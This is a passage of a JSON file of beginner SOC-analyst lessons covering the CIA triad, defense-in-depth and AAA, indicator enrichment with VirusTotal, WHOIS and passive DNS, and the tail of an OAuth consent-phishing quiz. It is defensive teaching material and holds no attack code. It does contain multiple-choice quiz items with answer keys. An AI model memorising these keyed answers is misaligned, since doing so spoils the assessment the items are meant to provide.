      "question": "In the Entra audit log event for a consent grant, targetResources[0].modifiedProperties contains a newValue of 'Mail.Read offline_access Files.Read.All' for an app named 'Mail Sync Helper' that no one on the security team recognises. What should this specific combination of fields most directly prompt the analyst to do?",
      "options": [
        {
          "label": "Ignore it, since 'Consent to application' events are purely informational and never indicate risk on their own.",
          "value": "a"
        },
        {
          "label": "Treat the sensitive, durable scopes granted to an unrecognised app as a high-priority lead and investigate the app and grantee.",
          "value": "b"
        },
        {
          "label": "Reset the consenting user's password immediately, since that alone fully revokes the app's access to the mailbox.",
          "value": "c"
        },
        {
          "label": "Wait for a sign-in risk alert on the same user before taking any action on the consent event.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "An unrecognised app being granted offline_access plus mailbox and file read scopes is exactly the high-value, durable combination attackers request, so it should be treated as a priority lead for investigation. Option a wrongly dismisses a meaningful audit event. Option c repeats the earlier lesson's key mistake: a password reset does not revoke a refresh token tied to app consent. Option d is backwards, since consent phishing typically produces no sign-in risk alert at all, which is precisely why the consent event itself must be the trigger."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1528/",
    "https://learn.microsoft.com/en-us/defender-cloud-apps/investigate-risky-oauth",
    "https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/manage-consent-requests",
    "https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/configure-user-consent",
    "https://learn.microsoft.com/en-us/entra/identity-platform/v2-permissions-and-consent"
  ],
  "xp": 260,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cia-triad-core-security-principles",
  "slug": "cia-triad-core-security-principles",
  "title": "The CIA Triad and Core Security Principles",
  "topic": "Security Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every alert a SOC analyst investigates ultimately comes down to a threat against one of three things: keeping data secret, keeping it trustworthy, or keeping it reachable. This lesson assumes you have never studied security theory before, and builds the whole picture from zero. We start with the plainest possible question — what does 'security' even mean, and what is it actually trying to protect? — before naming the CIA Triad (Confidentiality, Integrity, Availability), the three-part answer every security professional uses as a mental checklist. From there we walk through each property in turn, in plain language with worked examples, and then move to the working principles every analyst operates under day to day: defense-in-depth, least privilege, zero trust, and the AAA framework (Authentication, Authorization, Accounting) that underlies every login you will ever investigate. By the end of this lesson you will be able to look at any incident — a phishing email, a ransomware outbreak, a leaked database, a DDoS attack — and name precisely which security property was violated, which principle should have stopped it, and which AAA function generated the evidence you use to investigate it. This vocabulary is not academic: it is the shared language every SOC report, escalation, and conversation with a manager is built on.",
  "sections": [
    {
      "heading": "Start Here: What 'Security' Is Actually Protecting",
      "content": "Before any acronym makes sense, it helps to strip the word 'security' down to something you already understand. Imagine you own a house. What do you actually want from that house, security-wise? Three things, if you think about it honestly:\n\n- You want **only the people you invite** to be able to see what is inside — your mail, your documents, your belongings. Nobody should be able to peek through the window or rifle through your drawers without permission.\n- You want to **trust that nothing has been secretly changed** while you were out — that nobody swapped your prescription pills, forged a signature on your mail, or rearranged your safe's contents.\n- You want to be able to **get into your own house and use it whenever you need to** — nobody has changed the locks on you, blocked the driveway, or set the house on fire.\n\nNotice these are three genuinely different concerns, and a threat to one does not automatically threaten the others. A burglar who quietly photographs your documents and leaves violates the first concern but not the other two. A vandal who smashes your front door so you cannot get in violates the third concern even if they steal nothing. Digital security works exactly the same way, and information security professionals gave these three concerns formal names decades ago:\n\n- **Confidentiality** — only authorized people/systems can read the data.\n- **Integrity** — the data has not been secretly altered; you can trust it is accurate.\n- **Availability** — authorized people can access and use the data/system when they need to.\n\nTogether these three form the **CIA Triad** (nothing to do with the intelligence agency — just an acronym for Confidentiality, Integrity, Availability), the single most fundamental model in all of information security. It is not a product you buy or a rule you enforce directly; it is a **lens**, a checklist you run every incident through. Whenever something happens in your environment — a strange login, an odd file change, a service that stopped responding — the first analytical question a SOC analyst should silently ask is: *which of these three properties, if any, is being threatened right now?*\n\nHere is why that question matters so much in practice. It shapes:\n\n- **How urgent the incident is.** A confidentiality breach of customer credit-card numbers may trigger legal and regulatory deadlines that a minor availability blip never would.\n- **What evidence you need to collect.** An integrity concern means you need to prove what changed and when; a confidentiality concern means you need to prove what was accessed and by whom.\n- **How you talk to the rest of the business.** Saying 'we have an availability incident affecting checkout' tells a manager something completely different from 'we have a confidentiality incident affecting customer PII' — and both are far more useful than just saying 'something is wrong.'\n\nA quick worked example to anchor this before we go deeper: an employee's laptop is stolen from a coffee shop. Think through the Triad. If the disk is unencrypted, whoever has the laptop can read every file on it — a **confidentiality** risk. If the company loses that employee's ability to work until a replacement arrives, that is a minor **availability** hit for the business. If the thief somehow logged in and quietly edited a saved document before the laptop was recovered, that would be an **integrity** concern. Most real incidents, as you will see through this lesson, touch more than one leg of the Triad at once — but being able to name each affected leg precisely is the skill this lesson builds."
    },
    {
      "heading": "Confidentiality: Keeping Secrets Secret",
      "content": "**Confidentiality** means that data is only readable by the people and systems authorized to see it. When confidentiality holds, a customer database, a set of credentials, or an internal document stays within the intended audience. When it breaks, unauthorized parties gain access to information they should never have touched.\n\nThink of a locked filing cabinet in a doctor's office. Only staff with a key can open it. The **encryption** that protects a laptop's disk, the **access controls** on a shared folder, and the **TLS** (Transport Layer Security, the technology behind the padlock icon in a browser) that scrambles traffic in transit are all confidentiality mechanisms — digital versions of that lock. Here is the core idea of encryption in the simplest possible terms: readable data (**plaintext**) is run through a mathematical process with a secret key to produce scrambled data (**ciphertext**) that looks like random noise to anyone without the key:\n\n```\nPlaintext:   Patient SSN: 123-45-6789\nKey:         [secret encryption key]\nCiphertext:  8f3a91b0e7d2c4a1... (unreadable without the key)\n```\n\nIf an attacker steals the ciphertext but not the key, confidentiality holds — they have random-looking bytes, not the secret. This is why 'the data was encrypted' is often the single most important sentence in a breach disclosure.\n\nAttacks that map to confidentiality are about **theft and exposure**:\n\n- **Data exfiltration** — an attacker copies a customer database out to an external server.\n- **Credential theft** — phishing that harvests a password grants an outsider a valid identity.\n- **Eavesdropping / sniffing** — capturing unencrypted traffic on the network.\n- **Misconfigured storage** — a public cloud bucket that leaks files to anyone with the URL.\n\nWhat a **SOC analyst** watches for: large outbound data transfers to unusual destinations, access to sensitive files by accounts that never touch them, sign-ins from impossible locations, and DLP (Data Loss Prevention) alerts flagging PII or source code leaving the environment. A simplified DLP alert might look like this:\n\n```\nAlert: Sensitive-Data-Match\nRule: US-Social-Security-Number pattern\nUser: j.smith\nFile: customer_export.csv (240 matches)\nDestination: personal webmail upload\nAction: Blocked\n```\n\nWhen you triage such an alert, the core question is: *did unauthorized eyes reach data they should not have?* If yes, this is a **confidentiality** incident, and your report should identify what data was exposed, to whom, and over what channel. That scope directly drives breach-notification obligations, so precise documentation here matters beyond the technical fix."
    },
    {
      "heading": "Integrity: Can You Trust the Data?",
      "content": "**Integrity** means data and systems are accurate and have not been altered by an unauthorized party. You need to trust that a bank balance, a configuration file, or a log entry says what it is supposed to say. If you cannot trust that, the data is worthless no matter how well you protected its secrecy or its uptime.\n\nIntegrity mechanisms include **hashing** (running data through a function that produces a fixed-length fingerprint that changes completely if even one byte of the input changes), **digital signatures** (cryptographic proof that a specific party approved a specific piece of data), and **file-integrity monitoring** (software that watches critical files and alerts the moment they change). A tiny worked example shows why hashing is such a powerful integrity check:\n\n```\nOriginal file:  payroll.csv\nSHA-256 hash:   3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1\n\nAfter ONE character is changed by an attacker:\nSHA-256 hash:   8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa\n```\n\nChanging a single character produced a completely different fingerprint. This is exactly why hashes are used everywhere in security — to compare a stored hash against a freshly computed one and instantly know whether anything changed, without comparing every byte by hand.\n\nIntegrity attacks are about **tampering**: an attacker modifies a payroll record, defaces a website, plants a backdoor in code, or — critically for the SOC — **deletes or edits logs** to hide their tracks. **Ransomware** also violates integrity when it encrypts files in place, since the owner's key is gone and the data is no longer trustworthy or usable in its original form. As an analyst, unexpected changes to system files, new scheduled tasks, unexplained permission changes, or gaps in log continuity are your integrity red flags. A missing chunk of logs — say, a two-hour hole in an otherwise continuous record — is often more suspicious than any single alert, because it suggests someone specifically wanted that window hidden."
    },
    {
      "heading": "Availability: Can You Reach It When You Need It?",
      "content": "**Availability** means authorized users can reach the data and services when they need them. A system nobody can log into is failing at availability even if its data is perfectly secret and intact — a locked, fireproof, unreadable safe is secure in two out of three senses but useless to the people who legitimately need what is inside it.\n\nAvailability attacks are about **denial**:\n\n- **DDoS (Distributed Denial of Service)** — flooding a service with traffic from many sources so real users cannot connect.\n- **Ransomware** — locking files so the business cannot operate (it hits both integrity and availability at once).\n- **Destructive wiping** — deleting data or backups outright, sometimes as a final act by an attacker who has already achieved their real goal.\n\nA DDoS attack has a recognisable shape when you watch it happen. A simplified timeline from a web server's traffic monitor might read:\n\n```\n09:14:02  1,200 requests/sec  from ~40 IPs    -> /login  (normal peak load)\n09:14:05  18,500 requests/sec from ~3,000 IPs -> /login  (sudden spike, many sources)\n09:14:06  Web server CPU at 100%, response time climbing past 30 seconds\n09:14:10  Legitimate customers report the login page will not load\n```\n\nThe tell is the combination of *volume* and *source count*: a real traffic spike (a marketing campaign, a viral post) usually comes from a large but plausible spread of normal-looking users; a DDoS spike shows an implausible number of sources hammering one endpoint in a way normal usage never would.\n\n| Property | Question it answers | Example violation |\n|---|---|---|\n| Confidentiality | Who can read it? | Data leak |\n| Integrity | Can I trust it is unchanged? | Tampered logs |\n| Availability | Can I reach it when needed? | DDoS outage |\n\nMany real incidents hit more than one property at once — ransomware is the classic example, denying availability while destroying integrity, and sometimes stealing data first (confidentiality) in a **double-extortion** play, where the attacker both encrypts your systems and threatens to publish stolen data if you do not pay. Naming each affected property keeps your investigation and impact assessment complete, and it is exactly the habit this lesson is training."
    },
    {
      "heading": "Defense-in-Depth and Least Privilege",
      "content": "The CIA Triad describes *what* we protect. The core principles describe *how* we build defenses so that a SOC has something to monitor.\n\n**Defense-in-depth** is the principle of layered controls: never rely on a single wall. If a phishing email slips past the mail gateway, endpoint protection may still catch the payload; if that fails, network segmentation limits spread, and logging still records the activity for the SOC. Each layer is a chance to detect or stop the attacker. Think of a castle: a moat, then walls, then guards, then a locked keep. One failure does not lose the kingdom. A single attack attempt makes this visible:\n\n```\nAttack attempt: phishing email with malicious attachment\n  Layer 1 - Email gateway:        scans attachment, may miss a novel payload\n  Layer 2 - Endpoint protection:  may block execution\n  Layer 3 - Network segmentation: limits where the malware can spread if it runs\n  Layer 4 - Logging/SOC monitoring: records everything regardless, giving analysts a trail\n```\n\nThis is why analysts correlate signals across email, endpoint, and network — the layers are designed to back each other up, and an attack that trips several of them at once is a strong signal, not redundant noise.\n\n**Least privilege** means every user, service, and process gets only the access it needs to do its job — and nothing more. A help-desk account should not be a domain administrator. When least privilege is enforced, a compromised account can do limited damage, which shrinks the **blast radius** of any breach.\n\nFor the SOC, least privilege turns certain events into loud alarms:\n\n- A standard user account suddenly performing administrative actions.\n- A service account interactively logging in when it should only run in the background.\n- **Privilege escalation** — an account acquiring rights it never had before.\n\nThese are exactly the deviations analysts hunt for, because they signal an attacker trying to expand access. Related principles you will hear alongside least privilege are **need-to-know** (access to specific data, not just systems) and **separation of duties** (no single person can complete a sensitive action alone, reducing insider risk). Together, least privilege and defense-in-depth ensure that even a successful initial intrusion faces friction, leaves traces, and stays contained — giving the analyst both time and evidence to respond."
    },
    {
      "heading": "Zero Trust and AAA",
      "content": "**Zero trust** is a modern extension of least privilege captured by the phrase 'never trust, always verify.' Traditional security assumed anything inside the corporate network was safe. Zero trust drops that assumption: every request is authenticated and authorized regardless of where it comes from, because attackers who breach the perimeter would otherwise roam freely. In practice this means continuous verification, strong **MFA (Multi-Factor Authentication)**, device-health checks, and micro-segmentation. For a SOC, a zero-trust environment produces richer telemetry — each access decision is logged — giving analysts more visibility into lateral movement.\n\n**AAA** is the framework that makes identity-based security work. It stands for three linked functions:\n\n- **Authentication** — proving *who you are* (password, MFA token, certificate). It answers: is this really the user they claim to be?\n- **Authorization** — deciding *what you are allowed to do* once authenticated (which files, which commands). It answers: does this verified identity have permission for this action?\n- **Accounting** (also called auditing) — *recording what you did* (the logs of logins, access, and changes). It answers: what happened, by whom, and when?\n\nAccounting is the SOC analyst's lifeblood. Without the accounting logs — sign-in events, file-access records, command history — there is nothing to detect or investigate. Every investigation reconstructs a timeline from these records. A single AAA sequence, written out as an analyst would read it in a log, shows how the three functions interact:\n\n```\n08:59:58  AUTHENTICATION  user=d.rosen  method=password+MFA   result=SUCCESS\n09:00:01  AUTHORIZATION   user=d.rosen  resource=HR-FileShare  result=DENIED (not in HR-Access group)\n09:00:01  ACCOUNTING      user=d.rosen  action=access_attempt  resource=HR-FileShare  logged=yes\n```\n\nReading this: authentication succeeded (d.rosen really is d.rosen, confirmed by MFA), but authorization failed (d.rosen is not permitted to reach the HR share), and accounting recorded the whole exchange regardless of the outcome — exactly the record a SOC analyst pulls up later to answer 'did anyone access HR data they should not have?'\n\nMap the pieces to an incident and it clicks together: a **failed-login spike** is an authentication problem (someone guessing credentials); an account **reaching data it should not** is an authorization problem (least privilege or permissions failed); and the ability to **prove any of it happened** depends entirely on accounting. When you write an incident report, you are effectively narrating the accounting record to show where authentication or authorization broke, and which CIA property the attacker ultimately violated. These principles are not academic — they are the vocabulary you will use in every ticket you close."
    }
  ],
  "keyTakeaways": [
    "Security boils down to three plain questions the CIA Triad formalises: who can read it (Confidentiality), can I trust it is unchanged (Integrity), and can I reach it when I need to (Availability) — run this checklist against every incident to scope it precisely.",
    "Each property has a recognisable shape: confidentiality breaks look like exfiltration/DLP hits, integrity breaks look like a changed hash or a gap in logs, and availability breaks look like a DDoS traffic spike or ransomware lockout — and ransomware commonly hits all three at once via double-extortion.",
    "Defense-in-depth, least privilege, and zero trust exist to contain and expose attackers, while AAA (Authentication, Authorization, Accounting) provides the identity controls and — through accounting logs — the evidence a SOC analyst needs to detect and reconstruct any attack."
  ],
  "quiz": [
    {
      "question": "An analyst finds that an attacker gained access to a file server and quietly edited several months of application logs to remove traces of their activity, while leaving the data readable and the server online. Which element of the CIA Triad is most directly violated?",
      "options": [
        {
          "label": "Availability, because editing the logs prevented users from reaching the file server and its services.",
          "value": "a"
        },
        {
          "label": "Integrity, because the logs were altered by an unauthorized party and can no longer be trusted as accurate.",
          "value": "b"
        },
        {
          "label": "Confidentiality, because the attacker was able to read the sensitive contents of the log files.",
          "value": "c"
        },
        {
          "label": "Authentication, because the attacker must have stolen a valid password to reach the file server.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): altering data so it no longer reflects reality is the textbook definition of an integrity violation, and tampered logs specifically undermine the trustworthiness of evidence. (a) is wrong because the server stayed online and reachable, so availability was not denied. (c) is wrong because merely reading logs would be confidentiality, but the harm described is modification, not exposure. (d) names an access mechanism, not a CIA property — authentication is how they got in, not what was ultimately violated."
    },
    {
      "question": "A standard help-desk user account, which normally only resets passwords, is suddenly seen creating new domain administrator accounts at 3 a.m. Which core security principle is designed to make this activity both limited in damage and easy to flag as suspicious?",
      "options": [
        {
          "label": "Availability monitoring, which ensures that critical services stay online and reachable for all users.",
          "value": "a"
        },
        {
          "label": "Defense-in-depth, which layers multiple independent controls so no single failure loses everything.",
          "value": "b"
        },
        {
          "label": "Least privilege, which grants each account only the access it needs, making extra rights a red flag.",
          "value": "c"
        },
        {
          "label": "Accounting, which records every login and change so investigators can build a timeline later.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Correct is (c): least privilege means a help-desk account should never be able to create admins, so both the limited blast radius and the anomaly detection stem from that principle. (b) defense-in-depth is real and valuable but describes layering controls generally, not why this specific privilege deviation stands out. (d) accounting is what let you *see* the event, but it does not constrain what the account can do. (a) is unrelated — nothing here concerns service uptime."
    },
    {
      "question": "A company's e-commerce checkout page becomes unreachable for two hours after receiving an enormous volume of requests from thousands of different IP addresses, all hitting the same endpoint. Which CIA Triad property was violated, and what pattern does this match?",
      "options": [
        {
          "label": "Confidentiality, because the flood of traffic let the attacker silently read customer payment data during the outage.",
          "value": "a"
        },
        {
          "label": "Availability, because a DDoS flood prevented legitimate customers from reaching the checkout page for two hours.",
          "value": "b"
        },
        {
          "label": "Integrity, because the huge number of requests altered the checkout page's stored pricing and product data.",
          "value": "c"
        },
        {
          "label": "Authentication, because thousands of IP addresses each had to log in before the page became unreachable.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): an implausible volume of requests from thousands of sources overwhelming one endpoint is the classic DDoS shape, and its effect — legitimate users unable to reach the service — is a direct availability violation. (a) is wrong because nothing here describes data being read. (c) is wrong because no data alteration was described, only a traffic flood. (d) is wrong because DDoS traffic does not require authentication, and authentication is not itself a CIA property."
    }
  ],
  "references": [
    "https://csrc.nist.gov/glossary/term/cia_triad",
    "https://csrc.nist.gov/pubs/sp/800/207/final",
    "https://attack.mitre.org/tactics/TA0004/"
  ],
  "xp": 200,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-enrichment-tools-virustotal-whois-passive-dns",
  "slug": "enrichment-tools-virustotal-whois-passive-dns",
  "title": "Enrichment Tools: VirusTotal, WHOIS, and Passive DNS",
  "topic": "Threat Intelligence",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "When an alert drops an indicator on your desk — a file hash, a URL, a domain, an IP — your first job is enrichment: turning that bare, meaningless-looking artifact into context you can actually act on. This lesson assumes you have never enriched an indicator before, and starts from zero: what enrichment even means, why a lone IP address or domain tells you almost nothing by itself, and how a handful of everyday tools — VirusTotal, WHOIS, Passive DNS, and reputation feeds — turn that isolated artifact into a real verdict. You will see worked, line-by-line examples of what each tool's output actually looks like and how to read it, learn how to pivot from one indicator to an attacker's wider infrastructure, and finish with the OPSEC discipline that keeps your own lookups from tipping off the very attacker you are investigating.",
  "sections": [
    {
      "heading": "Start Here: What Enrichment Is and Why a Bare Indicator Tells You Nothing",
      "content": "Imagine a police officer runs a car's license plate before approaching it during a traffic stop. The plate number alone — a random string of letters and numbers — tells them nothing useful. But running it through a database instantly reveals who owns the car, whether it has been reported stolen, and whether the driver has outstanding warrants. That single lookup transforms a meaningless string into an actionable decision: approach cautiously, call for backup, or treat this as routine.\n\n**Enrichment** is exactly that process applied to security data. An **indicator** — also called an **IOC (Indicator of Compromise)** — is any piece of evidence tied to potentially malicious activity: a file's **hash** (a short fingerprint that uniquely identifies a specific file, covered in the CIA Triad lesson), a **URL**, a **domain name**, or an **IP address**. On its own, an indicator is just a string of characters. `203.0.113.45` tells you nothing until you ask questions about it: who owns it, what else has it done, has anyone else flagged it as bad?\n\nEnrichment is the practice of running an indicator through a set of tools and data sources to answer exactly those questions, turning a bare artifact into a decision. It sits right at the start of almost every SOC investigation: an alert fires with an IP address or a file hash attached, and before you can decide whether it is a real threat, you need context that the alert alone does not provide.\n\nFour tools cover the overwhelming majority of everyday enrichment work, and each answers a different question:\n\n| Tool | The question it answers |\n|---|---|\n| **VirusTotal (VT)** | Has anyone seen this file/URL/domain before, and did security tools flag it? |\n| **WHOIS** | Who registered this domain, and how old is it? |\n| **Passive DNS (pDNS)** | What IPs has this domain used, and what other domains share its infrastructure? |\n| **Reputation feeds** | Is this indicator already on a known-bad list, based on other people's observations? |\n\nNone of these tools gives you a certain verdict by itself — each gives you one piece of a picture, the way a detective gathers witness statements, fingerprints, and camera footage before drawing a conclusion. The skill this lesson builds is running an indicator through all four, reading each result critically, and combining them into a confident call. Let's take them one at a time, starting with the tool you will reach for first on almost every alert: VirusTotal."
    },
    {
      "heading": "Reading VirusTotal Without Over-Trusting It",
      "content": "**VirusTotal (VT)** is a free service that runs a submitted file, hash, URL, IP, or domain against dozens of antivirus engines and tools, then aggregates the results. It is usually the first stop when you have an unknown indicator, because it answers 'has anyone seen this before, and did anything flag it?' in seconds.\n\nA worked example makes this concrete. Suppose an EDR alert names a suspicious file, and you search its hash on VirusTotal. A simplified version of what you would see:\n\n```\nVirusTotal Report — SHA256: 44d88612fea8a8f36de82e1278abb02f\nDetections: 61 / 71 security vendors flagged this file\nPopular threat label: trojan.emotet/generic\nFirst submission to VT: 2019-08-14\nLast analysis: 2026-08-10\n\nRelations:\n  Contacted domains: 3\n  Contacted IP addresses: 5\n  Similar files (same family): 128\n```\n\nReading this: 61 of 71 engines agree it is malicious (a strong signal), the popular label points to the Emotet malware family, and — most useful for your next step — the Relations data lists three domains and five IPs this file is known to have contacted. Those become your pivots, which is exactly what the Passive DNS section below builds on.\n\nThe headline number is the **detection ratio** shown above (`61 / 71`), but beginners treat this like a simple score, and experienced analysts read it far more carefully:\n\n- **A low count is not a clean bill of health.** Fresh malware and targeted attacks are often detected by zero engines at first. `0/71` means *unknown*, not *safe*.\n- **A high count is not automatic proof of doom.** Engines copy each other and produce generic labels; a few detections on a common tool can be false positives.\n- **Read the labels, not just the number.** Names like `Trojan.GenericKD` are vague; a specific family name (e.g., `Emotet`, `Cobalt Strike`) is far more actionable.\n\nBeyond the detection tab, the real value is in context. The **Details** tab shows first-submission date and file properties. The **Relations** tab links the indicator to contacted domains, IPs, dropped files, and parent files — this is your pivot map. The **Community** tab and comments may hold analyst notes or threat-intel references.\n\n**Crucial caution:** when you *search* an existing hash, you only query VT's database. When you **upload a file**, that file becomes visible to VT's subscribers — which may include the attacker, or may leak sensitive corporate data. Never upload confidential documents or anything you would not want an adversary to see. Search by hash first; upload only when you understand the exposure."
    },
    {
      "heading": "WHOIS and Domain Age as a Signal",
      "content": "**WHOIS** is the public registration record for a domain. Querying it tells you when the domain was registered, who the registrar is, when it was last updated, when it expires, and sometimes registrant contact details (though these are frequently hidden behind **privacy protection** services today).\n\nA worked example: a user reports a suspicious email whose link points to `secure-login-update[.]com`. Running WHOIS on that domain returns something like:\n\n```\nDomain Name: SECURE-LOGIN-UPDATE.COM\nRegistrar: NameCheap, Inc.\nCreation Date: 2026-08-13T02:11:04Z\nRegistry Expiry Date: 2027-08-13T02:11:04Z\nUpdated Date: 2026-08-13T02:11:04Z\nRegistrant Organization: REDACTED FOR PRIVACY\nName Server: NS1.PRIVACYPROTECT.ORG\n```\n\nThe **Creation Date** is the field that matters most: this domain was registered three days before the phishing email arrived. Combined with the generic, privacy-protected registrant details (common for both attackers and legitimate small registrants, so not damning alone), the extreme freshness is strong supporting evidence that this domain exists purely for a short-lived campaign.\n\nThe single most useful field for a SOC analyst is that **creation date**, because it reveals **domain age**. Attackers register throwaway domains for phishing and command-and-control, use them for a short campaign, and abandon them. Legitimate businesses tend to have domains that are years old. So a domain that was **registered yesterday or a few days ago** — a **Newly Registered Domain (NRD)** — is a meaningful risk signal, especially when it appears in a phishing link or an unexpected outbound connection.\n\nConcrete ways WHOIS shows up in daily work:\n\n- A domain impersonating your bank was registered through a registrar known for lax abuse handling, adding to suspicion.\n- The registrant email or organization matches other known-bad domains, giving you a pivot.\n- An internal alert names a domain that turns out to be years old, run by a real business — a signal that this is more likely a false positive than a fresh campaign.\n\nUse WHOIS as **corroborating evidence**, not a sole verdict. Old domains can be compromised or bought, and some legitimate services spin up new domains. But combined with a poor reputation and suspicious content, a fresh registration date turns a maybe into a confident escalation. Many SIEM and threat-intel platforms let you **automatically flag NRDs** (commonly domains younger than 30 days) so analysts do not have to check each one by hand. When you write your ticket, recording the creation date and registrar gives the next analyst — and any escalation — instant context about *why* the domain looked suspicious."
    },
    {
      "heading": "Passive DNS and Pivoting Infrastructure",
      "content": "**Passive DNS (pDNS)** is a historical record of how domains and IP addresses have mapped to each other over time. Sensors around the internet observe DNS resolutions and store them, so instead of asking 'what does this domain resolve to right now?' you can ask 'what has it resolved to over the past months, and what else has lived on that IP?'\n\nThis historical view is what makes **pivoting** possible — expanding from one known indicator to the attacker's wider infrastructure:\n\n- **Domain to IP:** A malicious domain currently resolves to one address, but passive DNS shows it also used other IPs previously — new leads to investigate and block.\n- **IP to Domains:** That IP has hosted dozens of other domains, several with the same naming pattern — you may have uncovered a whole phishing kit's infrastructure.\n- **Shared hosting caution:** An IP hosting *thousands* of unrelated domains is likely a shared or CDN provider, so co-location there is weak evidence. Co-location on a small, dedicated server is much stronger.\n\nA worked example continues the case from the previous section. Running passive DNS on `secure-login-update.com` and then pivoting to the IP it resolves to might return:\n\n```\nPassive DNS history for secure-login-update.com\n2026-08-13 to present  -> 203.0.113.45\n\nPassive DNS history for 203.0.113.45 (other domains hosted on this IP)\naccount-verify-support.com\nbilling-update-secure.net\npassword-reset-portal.info\nsecure-login-update.com\n```\n\nOne IP is hosting four domains, all following the same 'verify / update / reset your account' naming pattern, registered within days of each other — this is not a coincidence; it is almost certainly one attacker's phishing kit reused across several campaigns. You have just turned a single reported email into a list of four domains and one IP worth blocking across the whole environment.\n\nThe practical payoff of pivoting: from a single alert you can build a list of related domains and IPs, then search your own logs to see whether *any* of them have been contacted by other hosts in your environment — turning one detection into full-scope discovery of who else is affected."
    },
    {
      "heading": "Reputation Feeds and Cross-Referencing",
      "content": "The last everyday tool is the **reputation feed** — a curated list, commercial or open-source, that scores IPs, domains, and URLs as malicious, suspicious, or clean based on other people's observed activity: spam sources, malware-hosting history, botnet command-and-control traffic. Where VirusTotal tells you what antivirus engines think of a specific file or URL, reputation feeds tell you what the wider security community has already observed about an IP or domain's *behaviour* over time.\n\nCommon sources an analyst reaches for:\n\n- **AbuseIPDB** — a crowd-sourced database where organisations report abusive IPs (spam, brute-forcing, scanning), producing a percentage 'abuse confidence score'.\n- **URLhaus** — a feed specifically tracking URLs actively distributing malware.\n- **Vendor threat-intel feeds** — commercial platforms (many SIEMs integrate these directly) that aggregate multiple sources into one score.\n\nA worked example continues the case: checking `203.0.113.45` on a reputation feed might return:\n\n```\nIP: 203.0.113.45\nAbuse Confidence Score: 92%\nTotal Reports: 47 (last 90 days)\nCategories: Phishing, Fraud VOIP, Web App Attack\nLast Reported: 2026-08-15\n```\n\nA 92% score with dozens of independent reports over the past three months is a strong, corroborating hit — combined with the fresh WHOIS registration and the shared-infrastructure pattern from passive DNS, you now have three independent sources agreeing this is malicious, which is a far stronger basis for action than any single tool alone.\n\nThe discipline that makes reputation feeds trustworthy is **cross-referencing**: never rely on one feed's score by itself. Feeds disagree, go stale, and occasionally flag legitimate infrastructure (a shared hosting IP where one tenant misbehaved can taint the whole address). A hit on a reputation feed adds real weight to your case; the absence of a hit means the indicator is *not yet reported* — still 'unknown,' not 'safe,' exactly like a 0/71 VirusTotal score. Checking two or three independent feeds and looking for agreement is what separates a confident verdict from a guess."
    },
    {
      "heading": "Putting It Together: Enrichment Workflow and OPSEC",
      "content": "Enrichment is a repeatable loop. Suppose an EDR alert fires on a workstation that connected to an unfamiliar domain and downloaded a file. A typical flow:\n\n1. **Hash the file** and search **VirusTotal** by hash. Read the detection labels and the Relations tab, noting any contacted domains or IPs.\n2. **WHOIS the domain.** Check the creation date — is it a newly registered domain? Note the registrar.\n3. **Passive DNS** the domain and its IPs. Pull historical mappings and co-located domains to map the infrastructure.\n4. **Check reputation feeds** for every indicator you have gathered — the original domain plus everything the pivots surfaced.\n5. **Search your own logs** for all of those indicators to find any other affected hosts.\n6. **Document** each indicator, what each tool said, and your verdict, so the next analyst can follow your reasoning.\n\nA completed enrichment summary, written the way you would actually document it in a ticket, might look like this:\n\n```\nIndicator: secure-login-update.com\nVirusTotal: 0/71 (unknown, no detections yet — domain too new to be seen)\nWHOIS: created 2026-08-13 (3 days before the reported email) via NameCheap, privacy-protected\nPassive DNS: resolves to 203.0.113.45, co-hosted with 3 other similarly-named domains\nReputation: AbuseIPDB 92% confidence, 47 reports, category = Phishing\nVerdict: MALICIOUS — newly registered phishing infrastructure, part of a small cluster.\nAction: Blocked at mail gateway and proxy; associated domains/IP added to blocklist.\n```\n\nNotice that the VirusTotal result alone (0/71) would have told you almost nothing — it was the combination of a fresh registration date, shared hosting with similarly-named domains, and an independent reputation hit that produced a confident verdict. This is the pattern to internalise: **enrichment is rarely one tool giving a clean yes/no; it is several imperfect signals agreeing.**\n\nThroughout, hold to one governing rule: **do not tip off the attacker.** This is the **OPSEC** (Operational Security) discipline of enrichment.\n\n- **Passive first.** Prefer lookups that query stored data (search a hash on VT, read passive DNS, check feeds) over actions that touch the attacker's infrastructure.\n- **Beware unique URLs.** Phishing and C2 links often embed a **victim-specific token** (e.g., `.../track?id=USER123`). If you paste that exact URL into VirusTotal or click it, the attacker sees it was accessed — and now knows their campaign was detected. They may burn the infrastructure, rotate domains, or accelerate the attack.\n- **Use sandboxes and proxies deliberately.** When you must detonate something, do it in an isolated environment through anonymized egress, never from your corporate IP, and strip or defang unique identifiers first.\n- **Defang indicators** in tickets and chat (`hxxp://evil[.]com`) so nobody clicks them by accident.\n\nEnrichment tools turn a bare indicator into a decision — but used carelessly they can betray your investigation. Reading each source critically (unknown is not safe) and moving quietly is what separates a junior lookup from real analyst tradecraft."
    }
  ],
  "keyTakeaways": [
    "Enrichment turns a bare indicator (hash, URL, domain, IP) into a decision by asking multiple sources the same set of questions — like running a license plate — because a lone indicator tells you nothing on its own.",
    "Enrich every indicator across multiple sources — VirusTotal for reputation and relations, WHOIS for domain age (newly registered domains are a strong signal), passive DNS for pivoting to related infrastructure, and reputation feeds for known-bad hits — and remember that a low or zero score means 'unknown,' never 'safe.'",
    "A confident verdict rarely comes from one tool; it comes from several imperfect signals agreeing, and OPSEC is part of the process — work from stored/passive data first, defang indicators, and never detonate or submit an attacker's victim-specific unique URL, because doing so tips them off that their campaign was detected."
  ],
  "quiz": [
    {
